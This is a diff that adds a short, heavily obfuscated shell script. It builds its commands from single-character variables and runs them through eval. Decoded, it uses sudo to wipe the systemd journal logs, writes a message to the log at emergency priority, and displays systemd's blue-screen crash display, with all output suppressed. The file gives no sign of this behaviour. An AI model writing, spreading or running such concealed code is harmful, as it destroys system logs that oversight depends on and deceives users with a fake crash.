@@ -1,0 +1,4 @@
+#!/bin/sh
+z="
+";fz='v';Qz=' ';Cz='X';Uz='g';az='j';Yz='u';dz='f';Rz='e';Gz='1';nz='b';bz='n';Dz='=';Bz='E';Az='T';ez='h';hz='>';lz='|';Iz='-';Oz='t';kz='&';gz='m';Fz='{';cz='c';Vz='.';Hz=':';Zz='d';Ez='$';Pz='o';Mz='y';Sz='r';iz='/';Kz='H';Jz='"';Lz='i';Nz='a';jz='2';mz='p';Xz='s';Wz='}';Tz='l';
+eval "$Az$Bz$Cz$Az$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Nz$Qz$Tz$Rz$Uz$Nz$Tz$Vz$Jz$Wz$z$Xz$Yz$Zz$Pz$Qz$az$Pz$Yz$Sz$bz$Nz$Tz$cz$Oz$Tz$Qz$Iz$Iz$Yz$Xz$Rz$Sz$Qz$Iz$Iz$dz$Tz$Yz$Xz$ez$Qz$Iz$Iz$Sz$Pz$Oz$Nz$Oz$Rz$Qz$Iz$Iz$fz$Nz$cz$Yz$Yz$gz$Iz$Oz$Lz$gz$Rz$Dz$Gz$Xz$Qz$hz$iz$Zz$Rz$fz$iz$bz$Yz$Tz$Tz$Qz$jz$hz$kz$Gz$z$Rz$cz$ez$Pz$Qz$Jz$Ez$Az$Bz$Cz$Az$Jz$Qz$lz$Qz$Xz$Yz$Zz$Pz$Qz$Xz$Mz$Xz$Oz$Rz$gz$Zz$Iz$cz$Nz$Oz$Qz$Iz$mz$Qz$Rz$gz$Rz$Sz$Uz$Qz$hz$iz$Zz$Rz$fz$iz$bz$Yz$Tz$Tz$Qz$jz$hz$kz$Gz$z$Xz$Yz$Zz$Pz$Qz$iz$Yz$Xz$Sz$iz$Tz$Lz$nz$iz$Xz$Mz$Xz$Oz$Rz$gz$Zz$iz$Xz$Mz$Xz$Oz$Rz$gz$Zz$Iz$nz$Xz$Pz$Zz$Qz$hz$iz$Zz$Rz$fz$iz$bz$Yz$Tz$Tz$Qz$jz$hz$kz$Gz"
